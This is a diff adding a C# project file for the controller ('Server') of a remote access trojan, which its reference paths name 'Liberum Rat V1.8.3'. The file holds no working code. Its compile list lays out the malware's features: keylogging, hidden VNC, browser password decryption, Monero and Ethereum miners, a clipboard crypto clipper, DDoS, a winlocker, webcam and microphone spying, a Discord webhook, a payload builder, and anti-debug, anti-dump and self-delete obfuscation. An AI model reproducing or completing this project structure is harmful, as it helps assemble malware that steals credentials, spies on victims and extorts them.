@@ -1,0 +1,628 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{29494141-C5E7-44C9-B8EA-5EE04278EFCD}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Server</RootNamespace>
+    <AssemblyName>Server</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>Server.ico</ApplicationIcon>
+    <StartupObject>Server.Program</StartupObject>
+    <LangVersion>8.0</LangVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="AntdUI, Version=1.8.6.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\AntdUI.1.8.6\lib\net46\AntdUI.dll</HintPath>
+    </Reference>
+    <Reference Include="BouncyCastle.Crypto">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\BouncyCastle.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="cGeoIp">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\cGeoIp.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.Core">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\GMap.NET.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.WindowsForms">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\GMap.NET.WindowsForms.dll</HintPath>
+    </Reference>
+    <Reference Include="IconExtractor">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Leb128">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\Leb128.dll</HintPath>
+    </Reference>
+    <Reference Include="MaterialSkin, Version=2.3.1.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\MaterialSkin.2.2.3.1\lib\net461\MaterialSkin.dll</HintPath>
+    </Reference>
+    <Reference Include="NAudio.Core">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\NAudio.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="NAudio.WinForms">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\NAudio.WinForms.dll</HintPath>
+    </Reference>
+    <Reference Include="NAudio.WinMM">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\NAudio.WinMM.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="RjControls">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\RjControls.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="Vestris.ResourceLib">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+    <Reference Include="WinFormAnimation">
+      <HintPath>..\..\..\Users\malic\Desktop\Новая папка\Liberum Rat V1.8.3 GLUE\WinFormAnimation.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Connectings\Certificate.cs" />
+    <Compile Include="Connectings\Clients.cs" />
+    <Compile Include="Connectings\Events\EventConnect.cs" />
+    <Compile Include="Connectings\Events\EventDisconnect.cs" />
+    <Compile Include="Connectings\LastPing.cs" />
+    <Compile Include="Connectings\Listner.cs" />
+    <Compile Include="CustomComparer.cs" />
+    <Compile Include="Data\BulidData.cs" />
+    <Compile Include="Data\Clipper.cs" />
+    <Compile Include="Data\MinerEtc.cs" />
+    <Compile Include="Data\MinerXMR.cs" />
+    <Compile Include="Data\ReverseProxyR.cs" />
+    <Compile Include="Data\ReverseProxyU.cs" />
+    <Compile Include="Data\Settings.cs" />
+    <Compile Include="Data\SocketData.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormAbout.Designer.cs">
+      <DependentUpon>FormAbout.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormAutoRun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormAutoRun.Designer.cs">
+      <DependentUpon>FormAutoRun.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormAutoRunSet.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormAutoRunSet.Designer.cs">
+      <DependentUpon>FormAutoRunSet.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormBulider.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormBulider.Designer.cs">
+      <DependentUpon>FormBulider.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormCamera.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormCamera.Designer.cs">
+      <DependentUpon>FormCamera.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormCertificate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormCertificate.Designer.cs">
+      <DependentUpon>FormCertificate.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormChat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormChat.Designer.cs">
+      <DependentUpon>FormChat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormClipboard.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormClipboard.Designer.cs">
+      <DependentUpon>FormClipboard.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormClipper.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormClipper.Designer.cs">
+      <DependentUpon>FormClipper.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormDDos.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormDDos.Designer.cs">
+      <DependentUpon>FormDDos.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormDesktop.Designer.cs">
+      <DependentUpon>FormDesktop.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormDeviceManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormDeviceManager.Designer.cs">
+      <DependentUpon>FormDeviceManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormDownload.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormDownload.Designer.cs">
+      <DependentUpon>FormDownload.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormExplorer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormExplorer.Designer.cs">
+      <DependentUpon>FormExplorer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormFun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormFun.Designer.cs">
+      <DependentUpon>FormFun.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormHostsFile.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormHostsFile.Designer.cs">
+      <DependentUpon>FormHostsFile.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormHVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormHVNC.Designer.cs">
+      <DependentUpon>FormHVNC.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormHVNCrun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormHVNCrun.Designer.cs">
+      <DependentUpon>FormHVNCrun.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormInput.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormInput.Designer.cs">
+      <DependentUpon>FormInput.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormKeyLogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormKeyLogger.Designer.cs">
+      <DependentUpon>FormKeyLogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormKeyLoggerPanel.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormKeyLoggerPanel.Designer.cs">
+      <DependentUpon>FormKeyLoggerPanel.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormMap.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormMap.Designer.cs">
+      <DependentUpon>FormMap.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormMicrophone.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormMicrophone.Designer.cs">
+      <DependentUpon>FormMicrophone.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormMinerEtc.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormMinerEtc.Designer.cs">
+      <DependentUpon>FormMinerEtc.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormNetstat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormNetstat.Designer.cs">
+      <DependentUpon>FormNetstat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormNotepad.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormNotepad.Designer.cs">
+      <DependentUpon>FormNotepad.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormPerformance.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormPerformance.Designer.cs">
+      <DependentUpon>FormPerformance.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormProcess.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormProcess.Designer.cs">
+      <DependentUpon>FormProcess.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormPrograms.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormPrograms.Designer.cs">
+      <DependentUpon>FormPrograms.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormRegedit.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormRegedit.Designer.cs">
+      <DependentUpon>FormRegedit.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditBinary.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditBinary.Designer.cs">
+      <DependentUpon>FormRegisterValueEditBinary.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditMultiString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditMultiString.Designer.cs">
+      <DependentUpon>FormRegisterValueEditMultiString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditString.Designer.cs">
+      <DependentUpon>FormRegisterValueEditString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditWord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormRegisterValueEditWord.Designer.cs">
+      <DependentUpon>FormRegisterValueEditWord.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormReverseProxy.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormReverseProxy.Designer.cs">
+      <DependentUpon>FormReverseProxy.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormReverseProxyR.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormReverseProxyR.Designer.cs">
+      <DependentUpon>FormReverseProxyR.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormReverseProxyU.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormReverseProxyU.Designer.cs">
+      <DependentUpon>FormReverseProxyU.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormService.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormService.Designer.cs">
+      <DependentUpon>FormService.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormSettings.Designer.cs">
+      <DependentUpon>FormSettings.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormShell.Designer.cs">
+      <DependentUpon>FormShell.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormSpeakerBot.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormSpeakerBot.Designer.cs">
+      <DependentUpon>FormSpeakerBot.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormSystemSound.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormSystemSound.Designer.cs">
+      <DependentUpon>FormSystemSound.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormUpload.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormUpload.Designer.cs">
+      <DependentUpon>FormUpload.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormVolumeControl.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormVolumeControl.Designer.cs">
+      <DependentUpon>FormVolumeControl.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormWindow.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormWindow.Designer.cs">
+      <DependentUpon>FormWindow.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormWinlocker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormWinlocker.Designer.cs">
+      <DependentUpon>FormWinlocker.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FormXmrMiner.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormXmrMiner.Designer.cs">
+      <DependentUpon>FormXmrMiner.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helper\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Helper\BitmapCoding.cs" />
+    <Compile Include="Helper\Bulider\EncryptString.cs" />
+    <Compile Include="Helper\Bulider\IconInjector.cs" />
+    <Compile Include="Helper\ByteConverter.cs" />
+    <Compile Include="Helper\CircularProgressBar.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Helper\DiscordWebhook.cs" />
+    <Compile Include="Helper\DynamicFiles.cs" />
+    <Compile Include="Helper\FormMaterial.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Helper\FormMaterial.Designer.cs">
+      <DependentUpon>FormMaterial.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helper\G722ChatCodec.cs" />
+    <Compile Include="Helper\HexEditor\ByteCollection.cs" />
+    <Compile Include="Helper\HexEditor\Caret.cs" />
+    <Compile Include="Helper\HexEditor\EditView.cs" />
+    <Compile Include="Helper\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Helper\HexEditor\HexViewHandler.cs" />
+    <Compile Include="Helper\HexEditor\IKeyMouseEventHandler.cs" />
+    <Compile Include="Helper\HexEditor\StringViewHandler.cs" />
+    <Compile Include="Helper\Methods.cs" />
+    <Compile Include="Helper\mh.cs" />
+    <Compile Include="Helper\PaleFileProtocol.cs" />
+    <Compile Include="Helper\Randomizer.cs" />
+    <Compile Include="Helper\RegeditControl\ListViewColumnSorter.cs" />
+    <Compile Include="Helper\RegistryKeyExtensions.cs" />
+    <Compile Include="Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Helper\RegistrySeeker.cs" />
+    <Compile Include="Helper\RegistryTreeView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Helper\RegistryValueLstItem.cs" />
+    <Compile Include="Helper\RegValueHelper.cs" />
+    <Compile Include="Helper\Sock5\AddressType.cs" />
+    <Compile Include="Helper\Sock5\Client.cs" />
+    <Compile Include="Helper\Sock5\HeaderTypes.cs" />
+    <Compile Include="Helper\Sock5\Server.cs" />
+    <Compile Include="Helper\Sock5\Socks5Request.cs" />
+    <Compile Include="Helper\Sock5\SocksError.cs" />
+    <Compile Include="Helper\Sock5\StreamTypes.cs" />
+    <Compile Include="Helper\Tasks\AutoTaskMgr.cs" />
+    <Compile Include="Helper\Tasks\Task.cs" />
+    <Compile Include="Helper\WordTextBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Helper\Xor.cs" />
+    <Compile Include="Messages\DecryptorBrowsers.cs" />
+    <Compile Include="Messages\HandlerAutoRun.cs" />
+    <Compile Include="Messages\HandlerBotSpeaker.cs" />
+    <Compile Include="Messages\HandlerCamera.cs" />
+    <Compile Include="Messages\HandlerChat.cs" />
+    <Compile Include="Messages\HandlerClipboard.cs" />
+    <Compile Include="Messages\HandlerClipper.cs" />
+    <Compile Include="Messages\HandlerConnect.cs" />
+    <Compile Include="Messages\HandlerDDos.cs" />
+    <Compile Include="Messages\HandlerDesktop.cs" />
+    <Compile Include="Messages\HandlerDeviceManager.cs" />
+    <Compile Include="Messages\HandlerError.cs" />
+    <Compile Include="Messages\HandlerExplorer.cs" />
+    <Compile Include="Messages\HandlerFileSearcher.cs" />
+    <Compile Include="Messages\HandlerFun.cs" />
+    <Compile Include="Messages\HandlerGetDLL.cs" />
+    <Compile Include="Messages\HandlerHostsFile.cs" />
+    <Compile Include="Messages\HandlerHVNC.cs" />
+    <Compile Include="Messages\HandlerKeyLogger.cs" />
+    <Compile Include="Messages\HandlerKeyLoggerPanel.cs" />
+    <Compile Include="Messages\HandlerMap.cs" />
+    <Compile Include="Messages\HandlerMicrophone.cs" />
+    <Compile Include="Messages\HandlerMinerEtc.cs" />
+    <Compile Include="Messages\HandlerMinerXmr.cs" />
+    <Compile Include="Messages\HandlerNetstat.cs" />
+    <Compile Include="Messages\HandlerNotepad.cs" />
+    <Compile Include="Messages\HandlerPerformance.cs" />
+    <Compile Include="Messages\HandlerPing.cs" />
+    <Compile Include="Messages\HandlerPong.cs" />
+    <Compile Include="Messages\HandlerProcess.cs" />
+    <Compile Include="Messages\HandlerPrograms.cs" />
+    <Compile Include="Messages\HandlerRecovery.cs" />
+    <Compile Include="Messages\HandlerRecovery1.cs" />
+    <Compile Include="Messages\HandlerRegedit.cs" />
+    <Compile Include="Messages\HandlerReportWindow.cs" />
+    <Compile Include="Messages\HandlerReverseProxy.cs" />
+    <Compile Include="Messages\HandlerReverseProxyR.cs" />
+    <Compile Include="Messages\HandlerReverseProxyU.cs" />
+    <Compile Include="Messages\HandlerSendDiskGet.cs" />
+    <Compile Include="Messages\HandlerSendMemoryGet.cs" />
+    <Compile Include="Messages\HandlerService.cs" />
+    <Compile Include="Messages\HandlerShell.cs" />
+    <Compile Include="Messages\HandlerSystemSound.cs" />
+    <Compile Include="Messages\HandlerVolume.cs" />
+    <Compile Include="Messages\HandlerWindow.cs" />
+    <Compile Include="Messages\Packet.cs" />
+    <Compile Include="Obfuscator\Helper\InjectHelper.cs" />
+    <Compile Include="Obfuscator\Helper\Methods.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\AntiDe4dot.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\AntiDebug.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\AntiDump.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\Antimanything.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\AntiTamper.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\Runtime\AntiDebugSafe.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\Runtime\AntiDumpRun.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\Runtime\EofAntiTamper.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Anti\Runtime\SelfDeleteClass.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Calli\Calli.cs" />
+    <Compile Include="Obfuscator\Obfuscator\ConstMelting\ConstMelting.cs" />
+    <Compile Include="Obfuscator\Obfuscator\CtrlFlow\Block.cs" />
+    <Compile Include="Obfuscator\Obfuscator\CtrlFlow\BlockParser.cs" />
+    <Compile Include="Obfuscator\Obfuscator\CtrlFlow\CflowV2.cs" />
+    <Compile Include="Obfuscator\Obfuscator\CtrlFlow\ControlFlowObfuscation.cs" />
+    <Compile Include="Obfuscator\Obfuscator\FakeAttributes\FakeAttributes.cs" />
+    <Compile Include="Obfuscator\Obfuscator\ImportProtect\ImportProtect.cs" />
+    <Compile Include="Obfuscator\Obfuscator\IntProtect\Int.cs" />
+    <Compile Include="Obfuscator\Obfuscator\IntProtect\IntEncoding.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Invalid\InvalidMD.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Invalid\InvalidOpcodes.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Junk\Junks.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Local2Field\Local2Field.cs" />
+    <Compile Include="Obfuscator\Obfuscator\ManyProxy\ManyProxy.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mixer\Mixer.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation1\Mutation1.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation1\MutationHelper.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Abs.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Add.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\CharMutations.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\ComparerMutation.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Div.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Func.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\FuncMutation.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\iMutation.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Mul.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\MulToShift.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Mutation2.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\StringLen.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Sub.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\Utils.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Mutation2\VariableMutation.cs" />
+    <Compile Include="Obfuscator\Obfuscator\ProtectStack\ProtectStack.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Proxy\EnumerableExtensions.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Proxy\EnumerableHelper.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Proxy\ProxyCall.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Proxy\ProxyInt.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Proxy\ProxyMeth.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Proxy\ProxyString.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Rename\Renamer.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Strings\Runtime\DecryptionHelper.cs" />
+    <Compile Include="Obfuscator\Obfuscator\Strings\StringEcnryption.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FormAbout.resources" />
+    <EmbeddedResource Include="Forms\FormAutoRun.resources" />
+    <EmbeddedResource Include="Forms\FormAutoRunSet.resources" />
+    <EmbeddedResource Include="Forms\FormBulider.resources" />
+    <EmbeddedResource Include="Forms\FormCamera.resources" />
+    <EmbeddedResource Include="Forms\FormCertificate.resources" />
+    <EmbeddedResource Include="Forms\FormChat.resources" />
+    <EmbeddedResource Include="Forms\FormClipboard.resources" />
+    <EmbeddedResource Include="Forms\FormClipper.resources" />
+    <EmbeddedResource Include="Forms\FormDDos.resources" />
+    <EmbeddedResource Include="Forms\FormDesktop.resources" />
+    <EmbeddedResource Include="Forms\FormDeviceManager.resources" />
+    <EmbeddedResource Include="Forms\FormDownload.resources" />
+    <EmbeddedResource Include="Forms\FormExplorer.resources" />
+    <EmbeddedResource Include="Forms\FormFun.resources" />
+    <EmbeddedResource Include="Forms\FormHostsFile.resources" />
+    <EmbeddedResource Include="Forms\FormHVNC.resources" />
+    <EmbeddedResource Include="Forms\FormHVNCrun.resources" />
+    <EmbeddedResource Include="Forms\FormInput.resources" />
+    <EmbeddedResource Include="Forms\FormKeyLogger.resources" />
+    <EmbeddedResource Include="Forms\FormKeyLoggerPanel.resources" />
+    <EmbeddedResource Include="Forms\FormMap.resources" />
+    <EmbeddedResource Include="Forms\FormMicrophone.resources" />
+    <EmbeddedResource Include="Forms\FormMinerEtc.resources" />
+    <EmbeddedResource Include="Forms\FormNetstat.resources" />
+    <EmbeddedResource Include="Forms\FormNotepad.resources" />
+    <EmbeddedResource Include="Forms\FormPerformance.resources" />
+    <EmbeddedResource Include="Forms\FormProcess.resources" />
+    <EmbeddedResource Include="Forms\FormPrograms.resources" />
+    <EmbeddedResource Include="Forms\FormRegedit.resources" />
+    <EmbeddedResource Include="Forms\FormRegisterValueEditBinary.resources" />
+    <EmbeddedResource Include="Forms\FormRegisterValueEditMultiString.resources" />
+    <EmbeddedResource Include="Forms\FormRegisterValueEditString.resources" />
+    <EmbeddedResource Include="Forms\FormRegisterValueEditWord.resources" />
+    <EmbeddedResource Include="Forms\FormReverseProxy.resources" />
+    <EmbeddedResource Include="Forms\FormReverseProxyR.resources" />
+    <EmbeddedResource Include="Forms\FormReverseProxyU.resources" />
+    <EmbeddedResource Include="Forms\FormService.resources" />
+    <EmbeddedResource Include="Forms\FormSettings.resources" />
+    <EmbeddedResource Include="Forms\FormShell.resources" />
+    <EmbeddedResource Include="Forms\FormSpeakerBot.resources" />
+    <EmbeddedResource Include="Forms\FormSystemSound.resources" />
+    <EmbeddedResource Include="Forms\FormUpload.resources" />
+    <EmbeddedResource Include="Forms\FormVolumeControl.resources" />
+    <EmbeddedResource Include="Forms\FormWindow.resources" />
+    <EmbeddedResource Include="Forms\FormWinlocker.resources" />
+    <EmbeddedResource Include="Forms\FormXmrMiner.resources" />
+    <EmbeddedResource Include="Helper\FormMaterial.resources" />
